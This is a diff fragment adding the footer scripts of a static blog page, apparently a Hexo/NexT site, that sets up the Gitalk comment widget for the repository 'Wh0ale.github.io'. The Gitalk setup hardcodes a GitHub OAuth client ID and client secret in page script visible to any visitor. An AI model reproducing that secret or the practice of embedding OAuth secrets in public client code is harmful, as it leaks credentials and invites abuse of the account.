+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
